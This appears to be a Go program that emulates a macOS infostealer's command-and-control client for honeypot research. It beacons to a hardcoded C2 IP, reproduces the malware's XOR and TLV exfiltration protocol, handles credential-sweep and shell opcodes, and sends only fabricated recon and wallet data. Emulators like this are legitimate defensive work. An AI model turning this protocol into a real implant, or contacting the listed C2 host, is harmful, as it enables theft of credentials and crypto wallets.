// Package main implements a C2 emulator for security research and honeypot analysis.
package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"embed"
	"encoding/binary"
	"fmt"
	"io"
	"log/slog"
	mathrand "math/rand/v2"
	"net"
	"net/http"
	"os"
	"strings"
	"time"
)

//go:embed screenshot.jpg
var embedFS embed.FS

const (
	C2Host    = "46.30.191.141"
	HTTPURL   = "http://46.30.191.141/index.php" //nolint:revive // unsecure-url-scheme: HTTP intentional for C2
	TCPPort   = "1337"
	UserAgent = "curl/8.4.0"
	IDFile    = ".victim_id"
	Marker    = 'K'
	// Boundary is the binary boundary decrypted from 0x10001a621.
	Boundary = "60ebe5b6-e8c2-4a2c-9037-647a50691f16"
	TCPSig   = 0x41765DDA
)

var OpcodeMap = map[string]string{
	"1": "FULL_RECON",
	"2": "SCREENSHOT",
	"3": "CREDENTIAL_SWEEP",
	"4": "FILE_SEARCH",
	"5": "EXEC_SHELL",
	"6": "TERMINATE",
}

type Emulator struct {
	Log      *slog.Logger
	Client   *http.Client
	UUID     string // 36-char string with hyphens
	RawID    string // 32-char uppercase hex
	Hostname string
	User     string
}

func NewEmulator() *Emulator {
	logger := slog.New(slog.NewJSONHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	id := loadUUID()
	return &Emulator{
		UUID:     id,
		RawID:    strings.ToUpper(strings.ReplaceAll(id, "-", "")),
		Hostname: "Alexs-MacBook-Air",
		User:     "alex",
		Log:      logger,
		Client: &http.Client{
			Timeout: 300 * time.Second, // Matches CURLOPT_TIMEOUT
			Transport: &http.Transport{
				DisableCompression: true,
			},
		},
	}
}

func loadUUID() string {
	if data, err := os.ReadFile(IDFile); err == nil {
		return strings.TrimSpace(string(data))
	}
	//nolint:gosec // Weak random intentional for realistic emulation
	id := fmt.Sprintf("%08X-%04X-4%03X-8%03X-%012X",
		mathrand.Uint32(), mathrand.Uint32()>>16, mathrand.Uint32()>>20, mathrand.Uint32()>>20, mathrand.Uint64()>>16)
	//nolint:gosec // File permissions match typical malware behavior
	if err := os.WriteFile(IDFile, []byte(id), 0o644); err != nil {
		// Continue without persisting ID
		return id
	}
	return id
}

func (e *Emulator) xor(data []byte) []byte {
	key := []byte(e.RawID)
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

// buildMultiplexedItem implements the binary TLV format from sym.func.10001108c.
func (*Emulator) buildMultiplexedItem(name string, data []byte) []byte {
	buf := new(bytes.Buffer)
	buf.WriteString(Boundary)
	buf.WriteByte(0x01) // Type: File
	//nolint:gosec // G115: integer overflow conversion int -> uint32 (data length bounded by protocol)
	if err := binary.Write(buf, binary.LittleEndian, uint32(len(data))); err != nil {
		// Writing to bytes.Buffer never errors, but satisfy linter
		return nil
	}
	//nolint:gosec // G115: integer overflow conversion int -> uint32 (name length bounded by protocol)
	if err := binary.Write(buf, binary.LittleEndian, uint32(len(name)+1)); err != nil {
		return nil
	}
	buf.WriteString(name)
	buf.WriteByte(0x00) // Null Terminator (Crucial for Parser Alignment)
	buf.Write(data)
	return buf.Bytes()
}

func (e *Emulator) postHTTP(payload []byte, label string) {
	encrypted := e.xor(payload)
	packet := make([]byte, 33+len(encrypted))
	copy(packet[0:32], e.RawID)
	packet[32] = Marker
	copy(packet[33:], encrypted)

	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, HTTPURL, bytes.NewBuffer(packet))
	if err != nil {
		return
	}
	req.Header = make(http.Header)
	req.Header["Host"] = []string{C2Host}
	req.Header["User-Agent"] = []string{UserAgent}
	req.Header["Accept"] = []string{"*/*"}
	req.Header["Content-Type"] = []string{"application/octet-stream"}
	req.Header["Expect"] = []string{"100-continue"}
	req.Header["Connection"] = []string{"Keep-Alive"}

	e.Log.Debug("http_exfil", "stage", label, "bytes", len(packet))
	resp, err := e.Client.Do(req)
	if err == nil {
		defer func() {
			if closeErr := resp.Body.Close(); closeErr != nil {
				e.Log.Debug("close_error", "error", closeErr)
			}
		}()
		if _, err := io.ReadAll(resp.Body); err != nil {
			e.Log.Debug("read_error", "error", err)
		}
	}
}

//nolint:revive,maintidx // Intentionally comprehensive for realistic C2 command emulation
func (e *Emulator) handleShell(command string) string {
	cmd := strings.TrimSpace(command)
	e.Log.Warn("REMOTE_SHELL", "cmd", cmd)
	//nolint:gosec // Weak random intentional for realistic command delay simulation
	time.Sleep(time.Duration(200+mathrand.IntN(300)) * time.Millisecond)

	// Handle common C2 reconnaissance commands
	switch {
	case cmd == "whoami":
		return e.User
	case cmd == "hostname":
		return e.Hostname
	case cmd == "pwd":
		return "/Users/" + e.User
	case cmd == "id":
		return "uid=501(" + e.User + ") gid=20(staff) groups=20(staff),12(everyone)," +
			"61(localaccounts),80(admin),701(com.apple.sharepoint.group.1)," +
			"33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers)"
	case cmd == "groups":
		return "staff everyone localaccounts admin com.apple.sharepoint.group.1 _appstore " +
			"_lpadmin _lpoperator _developer _analyticsusers"
	case cmd == "sw_vers":
		return "ProductName:\t\tmacOS\nProductVersion:\t\t14.2.1\nBuildVersion:\t\t23C71"
	case cmd == "uname":
		return "Darwin"
	case cmd == "uname -a":
		return "Darwin " + e.Hostname + " 23.2.0 Darwin Kernel Version 23.2.0: " +
			"Wed Nov 15 21:28:27 PST 2023; root:xnu-10002.61.3~2/RELEASE_ARM64_T8103 arm64"
	case cmd == "uname -s":
		return "Darwin"
	case cmd == "uname -m":
		return "arm64"
	case cmd == "uname -r":
		return "23.2.0"
	case cmd == "arch":
		return "arm64"

	// File system commands
	case cmd == "ls":
		return "Desktop\nDocuments\nDownloads\nLibrary\nMovies\nMusic\nPictures\nPublic"
	case cmd == "ls -la" || cmd == "ls -al":
		return "total 24\n" +
			"drwxr-x---+ 15 " + e.User + "  staff   480 Jan 15 14:23 .\n" +
			"drwxr-xr-x   5 root   admin   160 Sep 24 10:15 ..\n" +
			"-rw-------   1 " + e.User + "  staff   183 Jan 15 14:23 .bash_history\n" +
			"-rw-r--r--   1 " + e.User + "  staff  1024 Sep 24 10:15 .zshrc\n" +
			"drwx------+  5 " + e.User + "  staff   160 Jan 15 09:32 Desktop\n" +
			"drwx------+  8 " + e.User + "  staff   256 Jan 12 16:44 Documents\n" +
			"drwx------+ 12 " + e.User + "  staff   384 Jan 14 11:22 Downloads\n" +
			"drwx------@ 82 " + e.User + "  staff  2624 Jan 10 08:15 Library\n" +
			"drwx------   4 " + e.User + "  staff   128 Sep 28 12:01 Movies\n" +
			"drwx------   3 " + e.User + "  staff    96 Sep 24 10:22 Music\n" +
			"drwx------   5 " + e.User + "  staff   160 Oct 15 14:33 Pictures\n" +
			"drwxr-xr-x   4 " + e.User + "  staff   128 Sep 24 10:22 Public"
	case cmd == "ls -la ~/Documents":
		return "total 16\n" +
			"drwx------+  8 " + e.User + "  staff   256 Jan 12 16:44 .\n" +
			"drwxr-x---+ 15 " + e.User + "  staff   480 Jan 15 14:23 ..\n" +
			"-rw-r--r--   1 " + e.User + "  staff  1024 Feb 10 09:00 recovery_seed.txt\n" +
			"-rw-r--r--   1 " + e.User + "  staff  4096 Jan 08 11:15 passwords.docx"
	case cmd == "ls /Applications":
		return "1Password.app\nBrave Browser.app\nChrome.app\nDiscord.app\nElectrum.app\n" +
			"Exodus.app\nFirefox.app\nLedger Live.app\nSafari.app\nSignal.app\n" +
			"Slack.app\nTelegram.app\nVisual Studio Code.app"

	// Process and system info
	case cmd == "ps aux" || cmd == "ps -ef":
		return "USER   PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND\n" +
			e.User + "   412   2.1  1.4 34567890 123456   ??  S    Mon 9AM   42:13.45 " +
			"/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder\n" +
			e.User + "   428   1.8  2.1 45678901 234567   ??  S    Mon 9AM   38:22.11 " +
			"/Applications/Safari.app/Contents/MacOS/Safari\n" +
			e.User + "   501   0.5  0.8 12345678  87654   ??  S    Mon 9AM   12:05.33 " +
			"/Applications/Chrome.app/Contents/MacOS/Google Chrome\n" +
			e.User + "   612   0.2  0.3  9876543  34567   ??  S    Mon 9AM    5:11.22 " +
			"/System/Library/PrivateFrameworks/CloudKitDaemon\n" +
			e.User + "   702   0.0  0.1  5432109  12345   ??  S    Mon 9AM    0:45.67 /usr/libexec/trustd"
	case strings.HasPrefix(cmd, "ps aux | grep"):
		return e.User + "   1234   0.0  0.0  4268234    892 s000  S+    2:45PM   0:00.00 grep " +
			strings.TrimPrefix(cmd, "ps aux | grep ")
	case cmd == "top -l 1":
		return "Processes: 412 total, 2 running, 410 sleeping, 2124 threads\n" +
			"Load Avg: 2.15, 1.98, 1.87  CPU usage: 5.23% user, 8.12% sys, 86.65% idle\n" +
			"SharedLibs: 245M resident, 67M data, 23M linkedit.\n" +
			"MemRegions: 123456 total, 3456M resident, 123M private, 2345M shared.\n" +
			"PhysMem: 14G used (2145M wired), 2048M unused.\n" +
			"VM: 4567G vsize, 1234M framework vsize, 0(0) swapins, 0(0) swapouts."

	// Network commands
	case cmd == "ifconfig en0":
		return "en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n" +
			"\toptions=400<CHANNEL_IO>\n" +
			"\tether a4:83:e7:2f:b1:c3\n" +
			"\tinet 192.168.1.147 netmask 0xffffff00 broadcast 192.168.1.255\n" +
			"\tinet6 fe80::a683:e7ff:fe2f:b1c3%en0 prefixlen 64 scopeid 0x4\n" +
			"\tmedia: autoselect\n" +
			"\tstatus: active"
	case cmd == "ipconfig getifaddr en0":
		return "192.168.1.147"
	case cmd == "netstat -an":
		return "Active Internet connections (including servers)\n" +
			"Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)\n" +
			"tcp4       0      0  192.168.1.147.52341    17.248.144.25.443      ESTABLISHED\n" +
			"tcp4       0      0  192.168.1.147.52340    140.82.113.26.443      ESTABLISHED\n" +
			"tcp4       0      0  *.88                   *.*                    LISTEN"
	case strings.HasPrefix(cmd, "ping -c"):
		parts := strings.Fields(cmd)
		if len(parts) >= 3 {
			return "PING " + parts[2] + " (1.2.3.4): 56 data bytes\n" +
				"64 bytes from 1.2.3.4: icmp_seq=0 ttl=54 time=12.345 ms\n" +
				"64 bytes from 1.2.3.4: icmp_seq=1 ttl=54 time=11.234 ms"
		}
		return "ping: usage error: Destination address required"

	// macOS-specific commands
	case strings.HasPrefix(cmd, "system_profiler"):
		return "Hardware Overview:\n\n" +
			"      Model Name: MacBook Air\n" +
			"      Model Identifier: MacBookAir10,1\n" +
			"      Chip: Apple M1\n" +
			"      Total Number of Cores: 8 (4 performance and 4 efficiency)\n" +
			"      Memory: 16 GB\n" +
			"      System Firmware Version: 10151.61.4\n" +
			"      OS Loader Version: 10151.61.4\n" +
			"      Serial Number (system): C02ABC123DEF\n" +
			"      Hardware UUID: " + e.UUID
	case cmd == "csrutil status":
		return "System Integrity Protection status: enabled."
	case cmd == "spctl --status":
		return "assessments enabled"
	case cmd == "pmset -g":
		return "System-wide power settings:\n" +
			"Currently in use:\n" +
			" standbydelay         10800\n" +
			" womp                 1\n" +
			" hibernatefile        /var/vm/sleepimage\n" +
			" powernap             1\n" +
			" networkoversleep     0\n" +
			" sleep                10 (sleep prevented by coreaudiod)\n" +
			" ttyskeepawake        1\n" +
			" hibernatemode        3\n" +
			" displaysleep         10"

	// Launchctl
	case cmd == "launchctl list" || strings.HasPrefix(cmd, "launchctl list"):
		return "PID\tStatus\tLabel\n" +
			"412\t0\tcom.apple.Finder\n" +
			"428\t0\tcom.apple.Safari\n" +
			"501\t0\tcom.google.Chrome\n" +
			"-\t0\tcom.apple.icloud.fmfd\n" +
			"-\t0\tcom.apple.cloudd\n" +
			"-\t0\tcom.apple.notificationcenterui"

	// Environment and paths
	case cmd == "env" || cmd == "printenv":
		return "SHELL=/bin/zsh\n" +
			"USER=" + e.User + "\n" +
			"PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin\n" +
			"HOME=/Users/" + e.User + "\n" +
			"LOGNAME=" + e.User + "\n" +
			"TMPDIR=/var/folders/xy/abcd1234/T/\n" +
			"TERM=xterm-256color\n" +
			"LANG=en_US.UTF-8"
	case strings.HasPrefix(cmd, "echo $"):
		envVar := strings.TrimPrefix(cmd, "echo $")
		switch envVar {
		case "PATH":
			return "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
		case "HOME":
			return "/Users/" + e.User
		case "USER":
			return e.User
		case "SHELL":
			return "/bin/zsh"
		default:
			return ""
		}

	// User enumeration
	case cmd == "dscl . -list /Users":
		return "_amavisd\n_appleevents\n_applepay\n_appstore\n_ard\n" + e.User +
			"\ndaemon\nnobody\nroot"
	case cmd == "sudo -l":
		return "Sorry, user " + e.User + " may not run sudo on " + e.Hostname + "."
	case cmd == "w" || cmd == "who":
		return e.User + " console  Jan 15 09:32\n" + e.User + " ttys000  Jan 15 14:23"

	// File operations
	case strings.HasPrefix(cmd, "which "):
		binaryName := strings.TrimPrefix(cmd, "which ")
		binaryName = strings.TrimSpace(binaryName)
		switch binaryName {
		case "python", "python3":
			return "/usr/bin/python3"
		case "ruby":
			return "/usr/bin/ruby"
		case "perl":
			return "/usr/bin/perl"
		case "curl":
			return "/usr/bin/curl"
		case "git":
			return "/usr/bin/git"
		case "ssh":
			return "/usr/bin/ssh"
		case "openssl":
			return "/usr/bin/openssl"
		default:
			return "" // Binary not found (e.g., wget not installed by default on macOS)
		}
	case strings.HasPrefix(cmd, "cat "):
		filename := strings.TrimPrefix(cmd, "cat ")
		filename = strings.TrimSpace(filename)
		switch filename {
		case "/etc/passwd":
			return "nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\n" +
				"root:*:0:0:System Administrator:/var/root:/bin/sh\n" +
				"daemon:*:1:1:System Services:/var/root:/usr/bin/false\n" +
				e.User + ":*:501:20:User Name:/Users/" + e.User + ":/bin/zsh"
		case "~/.ssh/config", ".ssh/config":
			return "Host github.com\n  AddKeysToAgent yes\n  UseKeychain yes\n  IdentityFile ~/.ssh/id_ed25519"
		case "~/.zshrc", ".zshrc":
			return "export PATH=/usr/local/bin:$PATH\nalias ll='ls -la'\nexport EDITOR=vim"
		default:
			if strings.Contains(filename, "seed") || strings.Contains(filename, "wallet") ||
				strings.Contains(filename, "private") {
				return "[ENCRYPTED_WALLET_DATA_BLOB_" + strings.Repeat("A", 64) + "]"
			}
			return "cat: " + filename + ": No such file or directory"
		}
	case strings.HasPrefix(cmd, "find "):
		if strings.Contains(cmd, "wallet") || strings.Contains(cmd, "seed") ||
			strings.Contains(cmd, "Exodus") || strings.Contains(cmd, "Electrum") {
			return "/Users/" + e.User + "/Library/Application Support/Exodus/exodus.wallet\n" +
				"/Users/" + e.User + "/Library/Application Support/Electrum/wallets/default_wallet"
		} else if strings.Contains(cmd, ".ssh") {
			return "/Users/" + e.User + "/.ssh/config\n" +
				"/Users/" + e.User + "/.ssh/known_hosts"
		}
		return "/Users/" + e.User + "/Documents\n/Users/" + e.User + "/Desktop"
	case cmd == "df -h" || cmd == "df":
		return "Filesystem       Size   Used  Avail Capacity iused      ifree %iused  Mounted on\n" +
			"/dev/disk3s1s1  460Gi  9.8Gi  250Gi     4%  356821 4881967214    0%   /\n" +
			"/dev/disk3s6    460Gi  3.0Gi  250Gi     2%       3 4882324032    0%   /System/Volumes/VM\n" +
			"/dev/disk3s2    460Gi  197Gi  250Gi    45% 1024837 4881299198    0%   /System/Volumes/Data"
	case cmd == "date":
		return time.Now().Format("Mon Jan 2 15:04:05 MST 2006")
	case cmd == "uptime":
		return " 14:23  up 7 days,  3:42, 2 users, load averages: 2.15 1.98 1.87"

	// Default response for unknown commands
	default:
		parts := strings.Fields(cmd)
		if len(parts) > 0 {
			return "zsh: command not found: " + parts[0]
		}
		return "zsh: command not found"
	}
}

func (e *Emulator) runTCPChannel() {
	e.Log.Info("tcp_channel_connecting", "port", TCPPort)

	for {
		dialer := &net.Dialer{Timeout: 10 * time.Second}
		conn, err := dialer.DialContext(context.Background(), "tcp", C2Host+":"+TCPPort)
		if err != nil {
			e.Log.Debug("tcp_reconnect_waiting")
			time.Sleep(30 * time.Second)
			continue
		}

		// 1. Send Handshake Signature
		if err := binary.Write(conn, binary.BigEndian, uint32(TCPSig)); err != nil {
			if closeErr := conn.Close(); closeErr != nil {
				e.Log.Debug("handshake_close_error", "error", closeErr)
			}
			continue
		}

		for {
			// 2. Send Heartbeat
			heartbeat := fmt.Sprintf("ID: %s | STATUS: IDLE", e.RawID)
			payload := e.xor([]byte(heartbeat))
			//nolint:gosec // G115: integer overflow conversion int -> uint32 (length is bounded by protocol)
			if err := binary.Write(conn, binary.LittleEndian, uint32(len(payload))); err != nil {
				break
			}
			if _, err := conn.Write(payload); err != nil {
				break
			}

			// 3. Wait for Command
			var cmdLen uint32
			if err := conn.SetReadDeadline(time.Now().Add(70 * time.Second)); err != nil {
				break
			}
			err := binary.Read(conn, binary.LittleEndian, &cmdLen)
			if err != nil {
				break
			}

			cmdBuf := make([]byte, cmdLen)
			_, err = io.ReadFull(conn, cmdBuf)
			if err != nil {
				break
			}

			decrypted := string(e.xor(cmdBuf))
			e.Log.Info("tcp_command_received", "raw", decrypted)

			parts := strings.Split(decrypted, "|")
			opcode := parts[0]
			cmdName := OpcodeMap[opcode]

			// Action result exfiltration via HTTP (matching binary behavior)
			var result []byte
			switch cmdName {
			case "EXEC_SHELL":
				if len(parts) > 1 {
					result = []byte(e.handleShell(parts[1]))
				}
			case "SCREENSHOT":
				img, err := embedFS.ReadFile("screenshot.jpg")
				if err == nil {
					entropy := make([]byte, 16)
					if _, err := rand.Read(entropy); err == nil {
						result = e.buildMultiplexedItem("screenshot.jpg", append(img, entropy...))
					}
				}
			case "CREDENTIAL_SWEEP":
				result = e.buildMultiplexedItem("seed.txt", []byte("MOCK_SEED_12345"))
			default:
				result = []byte("DONE")
			}

			if len(result) > 0 {
				e.postHTTP(result, "cmd_result")
			}

			time.Sleep(60 * time.Second)
		}
		if err := conn.Close(); err != nil {
			e.Log.Debug("tcp_close_error", "error", err)
		}
	}
}

func main() {
	e := NewEmulator()
	e.Log.Info("brew_agent_online", "victim", e.RawID)

	// Step 1: Initial "Smash and Grab" via HTTP
	recon := fmt.Sprintf("UUID: %s\nmacOS Password: password123\nHostname: %s\nUsername: %s", e.UUID, e.Hostname, e.User)
	e.postHTTP(e.buildMultiplexedItem("recon.txt", []byte(recon)), "init_recon")

	time.Sleep(500 * time.Millisecond)
	e.postHTTP(e.buildMultiplexedItem("exodus.txt", []byte("FAKE_WALLET_DATA")), "init_loot")

	// Step 2: Persistent Command Channel via TCP
	e.runTCPChannel()
}
